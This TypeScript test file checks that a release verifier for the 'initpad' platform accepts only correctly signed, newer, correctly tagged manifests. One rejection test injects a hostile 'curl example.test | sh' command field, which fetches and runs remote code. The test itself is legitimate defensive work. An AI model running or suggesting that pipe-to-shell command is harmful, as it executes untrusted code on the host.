import assert from 'node:assert/strict';
import test from 'node:test';
import type { Bundle } from 'sigstore';
import { verifyPlatformRelease } from './release.js';

const repository = 'example/initpad';

function release(version = '0.3.0') {
  const image = (component: string, letter: string) => ({
    name: `ghcr.io/example/initpad-${component}`,
    digest: `sha256:${letter.repeat(64)}`,
    immutableReference: `ghcr.io/example/initpad-${component}@sha256:${letter.repeat(64)}`,
    platforms: ['linux/amd64', 'linux/arm64'],
  });
  const manifest = {
    schemaVersion: 1,
    component: 'initpad-platform',
    version,
    source: {
      repository: `https://github.com/${repository}`,
      tag: `initpad-v${version}`,
      commit: 'd'.repeat(40),
    },
    images: {
      api: image('api', 'a'),
      web: image('web', 'b'),
      supervisor: image('supervisor', 'c'),
    },
    compose: { file: 'initpad-release.override.yml', sha256: 'e'.repeat(64) },
    database: {
      migrationMode: 'expand-contract',
      rollback: 'image-compatible',
      backupRequired: true,
    },
  };
  return {
    version,
    manifestBase64: Buffer.from(JSON.stringify(manifest)).toString('base64'),
    bundle: { mediaType: 'application/vnd.dev.sigstore.bundle.v0.3+json' } as Bundle,
  };
}

test('accepts only the exact tagged platform workflow identity', async () => {
  const calls: unknown[][] = [];
  const verifier = (async (...args: unknown[]) => {
    calls.push(args);
    return {};
  }) as never;
  const manifest = await verifyPlatformRelease(release(), '0.2.0', repository, verifier);
  assert.equal(manifest.version, '0.3.0');
  assert.deepEqual(calls[0]?.[2], {
    certificateIssuer: 'https://token.actions.githubusercontent.com',
    certificateIdentityURI:
      'https://github.com/example/initpad/.github/workflows/release-platform.yml@refs/tags/initpad-v0.3.0',
    tlogThreshold: 1,
    ctLogThreshold: 1,
    timeout: 8_000,
    tufCachePath: '/var/lib/initpad-supervisor/sigstore-js',
    tufForceCache: false,
  });
});

test('rejects downgrade, executable fields and a foreign tag before installation', async () => {
  await assert.rejects(
    verifyPlatformRelease(release('0.2.0'), '0.2.0', repository, (async () => ({})) as never),
    /must be newer/,
  );
  await assert.rejects(
    verifyPlatformRelease(
      { ...release(), command: ['sh', '-c', 'curl example.test | sh'] },
      '0.2.0',
      repository,
      (async () => ({})) as never,
    ),
    /unsupported fields/,
  );
  const wrongTag = release();
  const manifest = JSON.parse(Buffer.from(wrongTag.manifestBase64, 'base64').toString('utf8')) as {
    source: { tag: string };
  };
  manifest.source.tag = 'initpad-v9.9.9';
  wrongTag.manifestBase64 = Buffer.from(JSON.stringify(manifest)).toString('base64');
  await assert.rejects(
    verifyPlatformRelease(wrongTag, '0.2.0', repository, (async () => ({})) as never),
    /manifest is invalid/,
  );
});
